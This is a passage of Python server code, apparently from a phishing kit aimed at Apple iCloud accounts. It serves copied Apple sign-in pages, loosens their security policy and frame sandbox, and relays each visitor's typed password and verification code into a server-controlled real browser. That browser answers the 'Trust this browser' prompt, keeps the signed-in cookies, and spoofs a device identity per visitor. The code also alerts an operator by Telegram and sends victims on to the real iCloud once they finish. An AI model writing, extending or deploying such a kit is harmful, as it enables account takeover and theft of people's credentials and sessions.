    seconds - which is what a poll does when the cookie is not sticking.
    """
    session = session_lookup(visitor_of(request))
    if session is None:
        return {"status": "idle", "browser_open": False, "error": "",
                "page": None, "browser": None, "session": ""}
    return {**session.state, "page": session.hub.page,
            "browser": session.hub.browser, "session": session.id,
            # Which screen this session's browser is on, when the machine has
            # none of its own: every session's is a different one.
            "screen": session.screen.display if session.screen else None,
            # The device this visitor's browser is, and where it leaves
            # from - so the page can say what is going on without asking.
            "identity": identity_summary(session),
            "exit": getattr(session, "exit", None) or {}}


def identity_summary(session: "Session") -> dict:
    """What the panel and the page are told about a session's identity."""
    identity = getattr(session, "identity", None)
    if identity is None:
        return {}
    said = identity.summary()
    said["group"] = identity.group
    return said


# --------------------------------------------------------------------------
# The captured pages
#
# src/ is served as it is. The file on disk is never written to, and the
# document is not rebuilt: scripts, styles, metas, policy and markup all go
# out as they came in. Three things are added on the way out, and each of
# them is something the engine needs:
#
#   * /sync.js, so the page reports what is done to it to the server;
#   * the capture's own Content-Security-Policy, extended with the sources
#     the engine needs - without this the policy refuses the engine that
#     was just added to it, and the page is a picture of a page;
#   * the frames the capture carries, given the page's own origin - without
#     this the sign-in form inside the frame cannot be reached at all.
#
# The tag goes in once: before </head>, or after <body> when the capture has
# no head, or at the top when it has neither.
# --------------------------------------------------------------------------

_SYNC_PRESENT = re.compile(r"""<script\b[^>]*\bsrc\s*=\s*["']?/sync\.js""", re.IGNORECASE)
_HTML_SUFFIXES = (".html", ".htm")


# --------------------------------------------------------------------------
# Reading the document
#
# A capture is a copy of a page, and the copy has the copy's own quirks. The
# one that matters here is that a tag's attributes have to be read properly:
# a SingleFile capture keeps a whole nested document inside an
# <iframe srcdoc="..."> attribute, and that document's tags are part of the
# attribute value, not part of the page. A ">" inside the value does not end
# the tag, and a "</head>" inside it does not end the page's head.
# --------------------------------------------------------------------------


def _tags(page_html: str):
    """Every tag in the document, in order.

    Yields (start, end, name, closing, text): where the tag is, what it is
    called, whether it closes, and the tag itself.
    """
    size = len(page_html)
    i = 0
    while i < size:
        i = page_html.find("<", i)
        if i < 0:
            return

        if page_html.startswith("<!--", i):
            end = page_html.find("-->", i + 4)
            if end < 0:
                return
            i = end + 3
            continue

        j = i + 1
        closing = page_html.startswith("/", j)
        if closing:
            j += 1

        name_at = j
        while j < size and page_html[j] not in " \t\r\n/>":
            j += 1
        name = page_html[name_at:j].lower()

        # Walk to the end of the tag, stepping over quoted attribute values.
        k = j
        while k < size:
            char = page_html[k]
            if char in "\"'":
                k = page_html.find(char, k + 1)
                if k < 0:
                    return
                k += 1
                continue
            if char == ">":
                break
            k += 1
        if k >= size:
            return

        yield i, k + 1, name, closing, page_html[i:k + 1]
        i = k + 1


def _attributes(tag_text: str):
    """The attributes of a start tag.

    Yields (name, value start, value end, quote). The span is into the tag
    text itself, so the caller can find the value again.
    """
    size = len(tag_text)
    i = 1
    while i < size and tag_text[i] not in " \t\r\n/>":
        i += 1

    while i < size:
        while i < size and tag_text[i] in " \t\r\n/":
            i += 1
        if i >= size or tag_text[i] == ">":
            break

        name_at = i
        while i < size and tag_text[i] not in " \t\r\n=/>":
            i += 1
        name = tag_text[name_at:i].lower()

        j = i
        while j < size and tag_text[j] in " \t\r\n":
            j += 1

        if j < size and tag_text[j] == "=":
            j += 1
            while j < size and tag_text[j] in " \t\r\n":
                j += 1
            if j < size and tag_text[j] in "\"'":
                quote = tag_text[j]
                start = j + 1
                end = tag_text.find(quote, start)
                if end < 0:
                    end = size
                yield name, start, end, quote
                i = end + 1
            else:
                start = j
                while j < size and tag_text[j] not in " \t\r\n>":
                    j += 1
                yield name, start, j, ""
                i = j
        else:
            yield name, i, i, ""


# --------------------------------------------------------------------------
# The capture's own policy
#
# A capture carries the policy of the page it was taken from, and that policy
# is as tight as policies get: "default-src 'none'", so nothing loads and
# nothing runs unless it is named. The engine is a script of ours, from our
# own origin, and it opens a socket to our own origin - and the policy says
# no to both, because it was written for a page that has no engine in it.
#
# So the policy is extended, not replaced: the sources the engine needs are
# added to the directives that are already there, and nothing else is
# widened. Everything the capture forbade stays forbidden, so the page still
# renders exactly as it was captured.
#
#   * script-src gains 'self', so the engine can be loaded at all;
#   * connect-src gains 'self' and the websocket schemes, so its socket can
#     be opened.
#
# A policy that says nothing about scripts is left alone: it already allows
# them.
# --------------------------------------------------------------------------

CSP_ENGINE_SCRIPT = "'self'"
CSP_ENGINE_CONNECT = "'self' ws: wss:"


def _relax_policy(policy: str, connect: str = "") -> str:
    """The policy, with the engine's own sources added to it.

    ``connect`` is an address the page is allowed to talk to - the server,
    when the page is a copy that lives on another host.
    """
    parts = [part.strip() for part in policy.split(";") if part.strip()]
    names = [part.split()[0].lower() for part in parts]

    def named(part: str, directive: str) -> bool:
        return part.split()[0].lower() == directive

    def widened(part: str, sources: str) -> str:
        """The directive with the sources it is missing."""
        tokens = part.split()
        for source in sources.split():
            if source not in tokens:
                part = part + " " + source
        return part

    if "script-src" in names or "script-src-elem" in names:
        parts = [
            widened(part, CSP_ENGINE_SCRIPT)
            if named(part, "script-src") or named(part, "script-src-elem")
            else part
            for part in parts
        ]
    elif "default-src" in names:
        # Scripts follow default-src, so they have to be named to be widened.
        parts.append("script-src " + CSP_ENGINE_SCRIPT)

    if "connect-src" in names:
        # 'self' alone is not enough for the socket everywhere: a browser that
        # does not treat ws:// as the same origin as http:// would refuse it.
        parts = [
            widened(part, CSP_ENGINE_CONNECT + (" " + connect if connect else ""))
            if named(part, "connect-src") else part
            for part in parts
        ]
    elif "default-src" in names:
        parts.append("connect-src " + CSP_ENGINE_CONNECT +
                     (" " + connect if connect else ""))

    return "; ".join(parts)


def _relax_csp(page_html: str, connect: str = "") -> str:
    """The capture's policy, extended for the engine.

    Only the metas that are really in the page are touched: the nested
    document inside an <iframe srcdoc="..."> has a policy of its own, and
    that one is left alone.

    ``connect`` is an address the page may talk to besides its own - the
    server, when the page is a copy that lives on another host.
    """
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "meta":
            continue

        equiv = None
        content = None
        for attr_name, a_start, a_end, quote in _attributes(text):
            if attr_name == "http-equiv":
                equiv = text[a_start:a_end].strip().lower()
            elif attr_name == "content":
                content = (a_start, a_end)

        if equiv != "content-security-policy" or content is None:
            continue

        a_start, a_end = content
        policy = text[a_start:a_end]
        relaxed = _relax_policy(policy, connect)
        if relaxed != policy:
            edits.append((start + a_start, start + a_end, relaxed))

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


# --------------------------------------------------------------------------
# The frames a capture carries
#
# A SingleFile capture keeps the sign-in form inside an <iframe srcdoc="...">,
# and that frame is sandboxed without allow-same-origin: it is a frame of an
# origin of its own, so the page cannot reach it - not its fields, not its
# buttons, nothing. The engine lives in the page, so the form would be a
# picture of a form.
#
# So a frame the capture carries is given the page's own origin. Nothing
# else about it changes: it keeps its sandbox, and it keeps its scripts.
# --------------------------------------------------------------------------


def _make_frames_reachable(page_html: str) -> str:
    """The frames the capture carries, given the page's own origin."""
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "iframe":
            continue

        attrs = list(_attributes(text))
        if not any(attr_name == "srcdoc" for attr_name, _, _, _ in attrs):
            continue

        for attr_name, a_start, a_end, quote in attrs:
            if attr_name != "sandbox" or quote == "":
                continue
            if "allow-same-origin" in text[a_start:a_end].split():
                continue
            edits.append((start + a_end, start + a_end, " allow-same-origin"))
            break

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


def _insert_point(page_html: str) -> int | None:
    """Where the engine tag goes: before </head>, else after <body>, else None.

    Tags inside a quoted attribute value are skipped. SingleFile captures keep
    a whole nested document in an <iframe srcdoc="..."> attribute, so their
    first </head> belongs to that inner document, not to the page: dropping a
    tag there would end the attribute early and cut the frame open.
    """
    for start, end, name, closing, text in _tags(page_html):
        if closing and name == "head":
            return start
        if not closing and name == "body":
            return end
    return None


def with_engine(page_html: str, connect: str = "", script: str = "") -> str:
    """The capture with the engine in it, and the two things the engine needs.

    Idempotent: a page that has been through this once is left alone.

    ``connect`` is an address the page may talk to besides its own, and
    ``script`` is where the engine is to be found - the server serves it at
    /sync.js, and a copy that lives elsewhere carries its own.
    """
    if _SYNC_PRESENT.search(page_html):
        return page_html

    page_html = _relax_csp(page_html, connect)
    page_html = _make_frames_reachable(page_html)

    tag = SYNC_TAG if not script else f'<script src="{script}"></script>'
    at = _insert_point(page_html)
    if at is None:
        return tag + page_html
    return page_html[:at] + tag + page_html[at:]


def captured_files(folder: Path) -> list[Path]:
    if not folder.is_dir():
        return []
    return sorted(
        p for p in folder.iterdir()
        if p.is_file() and p.suffix.lower() in _HTML_SUFFIXES
    )


def page_links(folder: Path) -> str:
    pages = captured_files(folder)
    if not pages:
        return (
            "<p>No captured pages yet. Put them in <code>src/</code>, "
            "starting with <code>1.html</code>.</p>"
        )
    links = "".join(
        f'<li><a href="/src/{quote(p.name)}">{html_module.escape(p.name)}</a></li>'
        for p in pages
    )
    return f"<ul>{links}</ul>"


PAGE_STYLE = """
  :root { color-scheme: dark; }
  body { margin:0; min-height:100vh; display:flex; align-items:center;
         justify-content:center; background:#000; color:#f5f5f7;
         font:16px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  main { max-width:44rem; padding:2.5rem 1.5rem; }
  h1 { font-size:1.35rem; margin:0 0 .75rem; font-weight:600; }
  p { color:#a1a1a6; margin:.6rem 0; }
  code { background:#1c1c1e; padding:.1rem .35rem; border-radius:.3rem; color:#f5f5f7; }
  ul { padding-left:1.2rem; }
  li { margin:.25rem 0; }
  a { color:#0a84ff; }
"""


def page_document(title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{html_module.escape(title)}</title>
<style>{PAGE_STYLE}</style>
</head>
<body><main>{body}</main></body>
</html>
"""


def listing_page(folder: Path) -> str:
    body = (
        "<h1>Captured pages</h1>"
        "<p>The app opens <code>1.html</code> once the browser is up. Every "
        "page here runs <code>/sync.js</code>, so what you type and click is "
        "reflected server-side and follows you between viewers.</p>"
        + page_links(folder)
    )
    return page_document("Captured pages", body)


def missing_page(path: str, folder: Path) -> str:
    where = (
        f"<code>src/{html_module.escape(path)}</code>" if path else "<code>src/</code>"
    )
    body = (
        f"<h1>Nothing captured at {where} yet</h1>"
        "<p>This route serves the HTML files that were captured earlier. Drop "
        "the capture into <code>src/</code> - starting with <code>1.html</code> "
        "- and reload.</p>"
        + page_links(folder)
    )
    return page_document("No captured page", body)


@app.get("/src")
@app.get("/src/{path:path}")
async def captured(request: Request, path: str = ""):
    """Serve a captured page (with the sync engine) or one of its assets.

    The visitor is named on the way out as well, so that a capture opened
    directly is still that visitor's capture - and still their browser.
    """
    folder = SRC.resolve()
    path = path.lstrip("/")

    # A person who has finished the process is sent to iCloud instead: the
    # code was good, the browser is in, and there is nothing left in the
    # captures for them to do.
    finished = session_lookup(visitor_of(request))
    if finished is not None and finished.hub.finished:
        return RedirectResponse(ICLOUD, status_code=302)

    if not path:
        if folder.is_dir():
            return HTMLResponse(listing_page(folder))
        return HTMLResponse(missing_page("", folder), status_code=404)

    target = (folder / path).resolve()
    try:
        target.relative_to(folder)
    except ValueError:
        # ../ or an absolute path: never read outside src/.
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.is_dir():
        return HTMLResponse(listing_page(target))

    if not target.is_file():
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.suffix.lower() in _HTML_SUFFIXES:
        # A capture is a page, and a page is somebody's: the visitor is
        # named on the way out, so that a capture opened directly is still
        # that visitor's capture - and still their browser. The stylesheets
        # and the scripts are not pages, and they are nobody's.
        session = session_for_named(request)
        source = target.read_text(encoding="utf-8", errors="replace")
        cookie = ({"Set-Cookie": session_cookie(session.id)}
                  if session is not None else {})
        return HTMLResponse(with_engine(source),
                            headers={**NO_STORE, **cookie})

    media_type = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
    return Response(
        content=target.read_bytes(),
        media_type=media_type,
        headers={"Cache-Control": "no-store"},
    )


@app.get("/sync.js")
async def sync_js():
    """The engine that runs inside every captured page."""
    return FileResponse(
        HERE / "sync.js",
        media_type="text/javascript",
        headers=NO_STORE,
    )


# The font a captured page is read in, served from here rather than fetched
# from a font house: a page that asks somebody else for its font is a page
# that looks broken wherever that somebody cannot be reached, and this app is
# meant to run on a machine that may have no network at all. The engine asks
# for it by this path, from the page and from the frames it carries - both of
# which the capture's own policy already allows, because it allows fonts from
# its own origin.
FONTS = HERE / "fonts"


@app.get("/fonts/{path:path}")
async def font_file(path: str):
    """A file out of fonts/, and nothing outside it."""
    folder = FONTS.resolve()
    target = (folder / path.lstrip("/")).resolve()
    try:
        target.relative_to(folder)
    except ValueError:
        # ../ or an absolute path: never read outside fonts/.
        return Response(status_code=404)
    if not target.is_file():
        return Response(status_code=404)

    media_type = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
    # A font is a file, not a page: it can be kept, and it never changes
    # without its name changing with it.
    return Response(
        content=target.read_bytes(),
        media_type=media_type,
        headers={"Cache-Control": "public, max-age=604800"},
    )


# --------------------------------------------------------------------------
# Live sync
#
# The captured page is a file, so nothing in it can know what anyone else is
# doing. The server is the shared state instead: which page is on screen, and
# every form value that has been typed into it. A viewer that connects is given
# that state; changes are broadcast to the other viewers; a click is relayed as
# a marker rather than replayed, because replaying it would press the button a
# second time.
# --------------------------------------------------------------------------

def clean_page(value) -> str:
    """A page we are willing to send a viewer to: inside /src/, and HTML."""
    if not isinstance(value, str):
        return ""
    if not value.startswith("/src/") or ".." in value:
        return ""
    if not value.lower().endswith(_HTML_SUFFIXES):
        return ""
    return value


def edit_go(page: str, field: str) -> str:
    """Where a capture goes when a field on it is edited.

    The flow says: editing the address on the password step takes the
    capture back to the address, the way iCloud does it. Nothing else is
    said, and nothing else moves.
    """
    for step in flow_steps():
        if step.get("page") != page:
            continue
        edits = step.get("edits")
        if not isinstance(edits, dict):
            continue
        go = clean_page(edits.get(field))
        if go:
            return go
    return ""


def came_from_a_capture(referrer) -> bool:
    """Was this document reached from another captured page?

    A viewer that has just loaded ``/src/2.html`` from a link on ``/src/1.html``
    is following a link, and the page it came from says so. A viewer that has
    just opened the app has the parent page as its referrer, and is not.
    """
    if not isinstance(referrer, str) or not referrer:
        return False
    try:
        path = urlsplit(referrer).path
    except ValueError:
        return False
    return path.startswith("/src/") and path.lower().endswith(_HTML_SUFFIXES)


class Viewer:
    """One browser tab watching a captured page.

    Messages go through a queue so a viewer that has stopped reading cannot
    block the others: it misses a keystroke rather than stalling the page.
    """

    def __init__(self, websocket: WebSocket):
        self.websocket = websocket
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        self.task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            message = await self.queue.get()
            await self.websocket.send_json(message)

    def send(self, message: dict) -> None:
        try:
            self.queue.put_nowait(message)
        except asyncio.QueueFull:
            pass

    def close(self) -> None:
        self.task.cancel()


class Hub:
    """The page everyone is on, what has been done to it, and where the
    browser is."""

    def __init__(self):
        self.viewers: set[Viewer] = set()
        self.page = START_PAGE
        self.values: dict[str, dict] = {}
        self.browser: dict = {"url": "", "title": "", "heading": "",
                              "alert": "", "fields": {}}
        # Has this visitor finished? Then the captures are closed to them.
        self.finished = False
        # The session this hub belongs to. It is what the hub tells when
        # the person is here.
        self.session = None

    def snapshot(self) -> dict:
        # A copy: the message sits in a queue, and a navigation in the meantime
        # must not empty the values the viewer was promised.
        return {
            "t": "state",
            "page": self.page,
            "values": {key: dict(entry) for key, entry in self.values.items()},
        }

    def join(self, viewer: Viewer) -> None:
        self.viewers.add(viewer)
        if self.session is not None:
            self.session.touch()
        viewer.send(self.snapshot())
        # Where the browser is, so a viewer that joins late is looking at the
        # same session the others are.
        viewer.send({"t": "browser", **self.browser})
        # And what this session is doing, so a page that has just arrived
        # knows where it stands without having to ask.
        viewer.send(self.session_state())
        # Somebody is here now, and the manager says so. The panel is a
        # subscriber, so it hears it from the manager rather than being
        # poked from inside the hub.
        if self.session is not None:
            SESSIONS.changed(self.session, why="presence")

    def session_state(self) -> dict:
        """What this session is doing, in one message.

        The launcher is one of the pages that waits: it stands on a black
        screen until the browser is ready, and then goes to the capture.
        It used to ask the server what was happening every quarter of a
        second - four requests a second, for as long as the browser took
        to open, through a tunnel that has to hold every one of them
        open. Now it is told, over the line the captures already use.
        """
        state = {}
        if self.session is not None:
            state = self.session.state or {}
        return {"t": "session",
                "status": str(state.get("status") or "idle"),
                "error": str(state.get("error") or ""),
                "browser_open": bool(state.get("browser_open")),
                "page": self.page}

    def tell_state(self) -> None:
        """Tell the pages watching what this session is doing.

        The same message a page gets when it arrives, so a page that is
        already here is told the same thing.
        """
        if self.session is None:
            return
        self.broadcast(self.session_state())

    def leave(self, viewer: Viewer) -> None:
        self.viewers.discard(viewer)
        viewer.close()
        # They are not here any more, and the manager says so.
        if self.session is not None:
            SESSIONS.changed(self.session, why="presence")

    def broadcast(self, message: dict, sender: Viewer | None = None) -> None:
        for viewer in list(self.viewers):
            if viewer is not sender:
                viewer.send(message)

    def navigate(self, page, sender: Viewer | None = None, everyone: bool = False) -> bool:
        """Follow the viewer that moved to another captured page.

        ``everyone`` is for a move that the viewer itself did not make: a
        button press that leads to the next step. The viewer that pressed
        it has to be told as well, or it stays where it was while everybody
        else moves on.
        """
        page = clean_page(page)
        if not page or page == self.page:
            return False
        if self.finished:
            # The person has finished the process. There is nothing to go
            # back to: the captures are closed to somebody who has already
            # got in.
            return False
        self.page = page
        # Form values belong to the page they were typed on.
        self.values = {}
        log(f"page: {page}")
        # The step the client is on has changed: the manager says so.
        if self.session is not None:
            SESSIONS.changed(self.session, why="page")
        self.broadcast({"t": "nav", "page": page},
                       sender=None if everyone else sender)
        return True

    def go_to_icloud(self) -> None:
        """The person has finished: the app takes them to iCloud.

        The code was good and the browser is in. Every viewer is sent there,
        and the captures are closed to them from then on.
        """
        was_finished = self.finished
        self.finished = True
        self.page = ICLOUD
        # The manager says the client is through, in the same breath as the
        # hub recording it - the panel hears it from there. A client who
        # reloads after getting in is not through a second time.
        if not was_finished and self.session is not None:
            SESSIONS.finished(self.session)
        # Form values belong to the page they were typed on.
        self.values = {}
        log("going to icloud.com")
        # The client is told it has finished before it goes, so that its
        # own browser keeps the fact: that is what sends it back to iCloud
        # next time instead of through the whole thing again.
        self.broadcast({"t": "finished", "page": ICLOUD})

    def handle(self, viewer: Viewer, message, session=None) -> None:
        if not isinstance(message, dict):
            return

        kind = message.get("t")

        # Anything the page says is the person doing something. This is
        # what keeps a session alive while somebody is working in it, and
        # it is the opposite of the server's own polling, which is not the
        # person being here at all.
        if session is not None:
            session.touch()

        if kind == "hello":
            # A viewer that has just loaded asks what it should be showing.
            # If it got there by following a link, that is a navigation - the
            # beacon may have been lost on the way - so the hub follows it.
            #
            # Their own browser says where they got to. Somebody who has
            # already got in is sent to iCloud and not through the whole
            # thing again; somebody whose browser has no state, or whose
            # state does not say they finished, starts the process as
            # usual.
            state = message.get("state")
            if isinstance(state, dict) and state.get("finished"):
                log(f"session {session.id if session else '?'} has finished "
                    f"- going to icloud.com")
                self.go_to_icloud()
                return
            if came_from_a_capture(message.get("from")):
                self.navigate(message.get("page"), sender=viewer)
            # A capture is on screen, so the launcher is not where it was:
            # whatever it said about the copy is over, and the panel should
            # not go on saying it.
            if self.session is not None:
                self.session.launcher_page = ""
                self.session.launcher_why = ""
            viewer.send(self.snapshot())

        elif kind == "nav":
            self.navigate(message.get("page"), sender=viewer)

        elif kind == "value":
            key = message.get("key")
            if not isinstance(key, str) or not key or len(key) > 2000:
                return
            raw_value = message.get("value")
            entry = {
                "value": raw_value[:10000] if isinstance(raw_value, str) else "",
                "checked": bool(message.get("checked")),
            }
            self.values[key] = entry
            self.broadcast({"t": "value", "key": key, **entry}, sender=viewer)

        elif kind == "click":
            x, y = message.get("x"), message.get("y")
            if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
                return
            self.broadcast(
                {
                    "t": "click",
                    "key": str(message.get("key") or "")[:2000],
                    "x": x,
                    "y": y,
                },
                sender=viewer,
            )

        elif kind == "where":
            # "Where is the browser?" A document has just been bound and may
            # hold fields the browser knows about and the page does not, so
            # the state is sent again to this viewer.
            viewer.send({"t": "browser", **self.browser})

        elif kind == "splash":
            # The launcher says where it is, and where it is going.
            #
            # When the launcher is on a capture's page, the copy is serving
            # the launcher there instead of the capture - and the visitor
            # would go round and round for ever, because from their side it
            # looks like a page that simply reloads. And when it says it is
            # going to the same place twice, the host is answering with
            # the launcher again.
            #
            # Both are said out loud, because nothing else would say them.
            # And they are kept on the session, so the panel shows them too:
            # the operator does not have to read the log to know that the
            # copy they set up is not serving the captures.
            page = str(message.get("page") or "")
            going = str(message.get("going") or "")
            why = str(message.get("why") or "")
            if self.session is not None:
                self.session.launcher_page = page
                self.session.launcher_why = why
            if "/src/" in page:
                log(f"the launcher is on {page} - the copy is serving the "
                    f"launcher there, not the capture")
            elif why:
                log(f"the launcher: {why}")
            if going and self.session is not None:
                if self.session.launcher_going == going:
                    log(f"the launcher is going to {going} again - the host "
                        f"is answering with the launcher again")
                self.session.launcher_going = going
            if self.session is not None:
                SESSIONS.changed(self.session, why="splash")

        elif kind == "field":
            # A value typed into the capture, written into the browser the
            # server holds. The capture keeps the ids of the page it was
            # taken from, so the field with that id in the capture is the
            # field with that id in the browser - in whichever frame of the
            # browser has it.
            #
            # A control with no id - Apple's verification code boxes have
            # none - is named by its place instead: the third input of the
            # page, and how many inputs it has.
            if session is None:
                return

            element = live.element_id(message.get("id"))
            value = message.get("value")
            value = value if isinstance(value, str) else ""

            if element:
                spawn(write_to_browser(session, element, value))
                return

            tag = message.get("tag")
            n = message.get("n")
            of = message.get("of")
            cls = message.get("cls")
            if isinstance(tag, str) and isinstance(n, int) and isinstance(of, int):
                spawn(write_at_to_browser(session, tag, n, of, value,
                                         cls if isinstance(cls, str) else ""))

        elif kind == "edit":
            # The person has changed a field on the capture. What that means
            # is the flow's business: editing the address on the password
            # step takes the capture back to the address, the way iCloud
            # does it.
            if session is None:
                return

            element = live.element_id(message.get("id"))
            if not element:
                return

            page = message.get("page")
            if not isinstance(page, str) or not page:
                page = self.page

            go = edit_go(page, element)
            if not go:
                return

            log(f"flow: {page} {element} edited -> {go}")
            # The browser keeps the new value: the field message that came
            # with this one has already put it there. The password goes with
            # it though - a password that went with an address is of no use
            # now the address is a different one. That is what iCloud does.
            spawn(write_to_browser(session, "password_text_field", ""))
            # Everyone moves, including the viewer that edited: it did not
            # follow a link, so nothing else would take it there.
            self.navigate(go, sender=viewer, everyone=True)

        elif kind == "press":
            # A button pressed in a capture. What it does depends on where
            # it was pressed: the flow says which capture leads to which,
            # and whether the press also happens in the browser.
            element = live.element_id(message.get("id"))
            if not element:
                return

            page = message.get("page")
            if not isinstance(page, str) or not page:
                page = self.page

            step = flow_step(page, element)
            if step is None:
                # No flow says otherwise, so the press happens in the
                # browser, as it always did.
                if session is not None:
                    spawn(press_in_browser(session, element))
                return

            if step.get("live") and session is not None:
                spawn(press_in_browser(session, element))

            go = step.get("go")
            if not isinstance(go, str) or not go:
                return

            if step.get("wait") and session is not None:
                # The capture does not move on because a button was
                # pressed: it moves when the browser has taken the details
                # and gone on to the next step. Until then the capture stays
                # where it is, and what the browser says about the details
                # is shown on it.
                browser = session.hub.browser or {}
                session.waiting = {
                    "field": element,
                    "fields": watch_fields(browser.get("fields") or {}),
                    "heading": browser.get("heading", ""),
                    "until": step.get("until") if isinstance(step.get("until"), dict) else {},
                    "url": browser.get("url", ""),
                    "go": go,
                    "page": page,
                    "since": time.monotonic(),
                }
                log(f"flow: {page} {element} -> {go} (waiting for the browser)")
                return

            log(f"flow: {page} {element} -> {go}")
            # Everyone moves, including the viewer that pressed: it did
            # not follow a link, so nothing else would take it there.
            self.navigate(go, sender=viewer, everyone=True)


# --------------------------------------------------------------------------
# The flow
#
# A capture is a step of a journey, and the journey is the user's: which
# capture leads to which, and whether a button pressed on one of them is
# also pressed in the browser.
#
# It is said in a file next to the captures, src/flow.json:
#
#   {
#     "steps": [
#       {"page": "/src/1.html", "press": "sign-in", "go": "/src/4.html",
#        "live": true},
#       {"page": "/src/4.html", "press": "sign-in", "go": "/src/2.html",
#        "live": true, "wait": true}
#     ]
#   }
#
# "page" is the capture the press happened on and "press" is the id of the
# control that was pressed ("*" for any control on that page). "go" is the
# capture the app moves to - every viewer follows - and "live" says whether
# the press also happens in the browser. A step without "live" does not
# touch the browser: pressing Continue on a capture that has not asked for
# a password yet would submit an empty form to the site.
#
# "wait" says that the app does not move on just because a button was
# pressed: it moves when the browser has taken the details and gone on to
# the next step. Until then the capture stays where it is, and what the
# browser says about the details - "Check the account information you
# entered and try again." - is shown on it. A person who has typed the
# wrong password should not be carried off to the next page as if they had
# not.
#
# A press the flow does not mention still happens in the browser, as it
# always did. There is no flow file, there is no flow.
# --------------------------------------------------------------------------

FLOW_FILE = "flow.json"


def flow_steps() -> list:
    """The steps the captures are put through, if the folder says."""
    try:
        raw = (SRC / FLOW_FILE).read_text(encoding="utf-8")
    except OSError:
        return []

    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        log(f"flow: {FLOW_FILE} is not json - ignored")
        return []

    steps = data.get("steps") if isinstance(data, dict) else data
    if not isinstance(steps, list):
        return []
    return [step for step in steps if isinstance(step, dict)]


def flow_blocked() -> dict:
    """What the flow says about an account the browser says is locked.

    Apple locks an account that has been signed in to from somewhere new, and
    the page it shows says so instead of carrying on: "This Apple Account has
    been locked for security reasons." Nothing else in the journey is coming,
    so the app stops waiting for it and shows the capture that says what
    happened. It is the flow that says which words mean which capture - the
    app does not know Apple's wording, and should not have to.

        {"says": "This Apple Account has been locked for security reasons",
         "go": "/src/5.html"}

    A flow that says nothing about it is a flow with no such page.
    """
    try:
        raw = (SRC / FLOW_FILE).read_text(encoding="utf-8")
    except OSError:
        return {}
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        return {}
    rule = data.get("blocked") if isinstance(data, dict) else None
    if not isinstance(rule, dict):
        return {}
    return rule


def flow_step(page: str, element: str) -> dict | None:
    """What pressing this control on this page does, if the flow says."""
    for step in flow_steps():
        if step.get("page") != page:
            continue
        wanted = step.get("press")
        if wanted not in (element, "*"):
            continue
        return step
    return None


# --------------------------------------------------------------------------
# The visitors
#
# Everyone who visits the site gets their own browser, their own profile and
# their own capture. Two people using the app at the same time do not share
# a session, do not share a page, and do not see each other's typing.
#
# The visitor is named by a cookie: a name, not a secret. It says whose
# browser this is, and nothing else.
# --------------------------------------------------------------------------


class Session:
    """One visitor: their browser, their profile, their capture."""

    def __init__(self, sid: str):
        self.id = sid
        self.bridge = live.Bridge()
        self.hub = Hub()
        self.hub.session = self
        self.pw = None
        self.ctx = None
        self.page = None
        # The Xvfb this session's browser is on, when the machine has no
        # screen of its own. One per session, closed with the browser.
        self.screen = None
        self.state = {
            "status": "idle",      # idle | running | done | error
            "step": "",
            "error": "",
            "browser_open": False,
        }
        self.seen = time.monotonic()
        # Where the launcher said it was going, last time. It is here so
        # that a launcher going round in circles can be said out loud.
        self.launcher_going = ""
        # Where the launcher says it is, and why it is going there. A copy
        # that is serving the launcher where the capture should be looks,
        # from the visitor's side, like a page that simply reloads - so it
        # is said here, where the operator can see it.
        self.launcher_page = ""
        self.launcher_why = ""
        # Has the browser shown the sign-in form? It has to have, before the
        # form being gone can mean anything: a browser that has only just
        # opened icloud.com has no form on it yet.
        self.saw_sign_in = False
        # What the app is waiting for: the browser to accept what was typed
        # into the capture, before the capture moves on.
        self.waiting: dict | None = None
        # "Trust this browser?" comes after the code is accepted, and the
        # app answers it. This says whether it has been answered, and since
        # when it has been asked.
        self.trusted = False
        self.trust_since = 0.0
        # Has this visitor signed in? Then their cookies are kept while the
        # browser is open, so they can be had when it is not.
        self.signed_in = False
        self.cookies: list = []
        self.cookies_at = 0.0
        # The device this visitor's browser is, and the group of address
        # they leave from. Both are kept with the profile, so a visitor
        # who comes back gets the same machine and the same address.
        self.identity = None
        self.group = ""
        # Where the browser really left from, and whether that was checked.
        self.exit: dict = {}

    def profile(self) -> Path:
        """Where this visitor's browser keeps its memory."""
        return PROFILES / self.id

    def touch(self) -> None:
        self.seen = time.monotonic()

    async def close(self) -> None:
        """Shut the browser down. The profile stays: that is the session."""
        self.bridge.detach()
        try:
            if self.ctx is not None:
                await self.ctx.close()
        except Exception:
            pass
        self.ctx = None
        self.page = None
        # A screen made for this browser goes with it. Nobody else was ever
        # on it, so there is nothing to leave running.
        if self.screen is not None:
            try:
                await self.screen.stop()
            except Exception:
                pass
            self.screen = None
        self.state["browser_open"] = False
        self.state["status"] = "idle"


# Every client, in one place. The manager is the door a visitor comes
# through - ``arrive`` makes their session, ``lookup`` finds it, ``retire``
# puts it away - and it tells whoever subscribed when any of that happens.
# The control room is a subscriber, so the panel is told what changed
# rather than asking for the list again.
SESSIONS = sessions.MANAGER

# The sessions that have gone away. A visitor whose browser has been shut
# down is still a visitor: the panel says what they got to and when they
# were last here, and the profile they left behind is still on disk. It is
# the manager's own record, not a second one kept here.
GONE = SESSIONS.gone


def new_session_id() -> str:
    return sessions.new_session_id()


async def notify_new_client(sid: str) -> None:
    """Tell the operator, on Telegram, that somebody new has connected.

    The settings are the operator's own, and they are kept in the admin
    store. Nothing is sent when they are not there, or when they are turned
    off, or when Telegram says no.
    """
    settings = admin.STORE.telegram()
    if not settings["enabled"] or not settings["token"] or not settings["chat_id"]:
        return
    went, said = await telegram_module.send(
        settings["token"], settings["chat_id"],
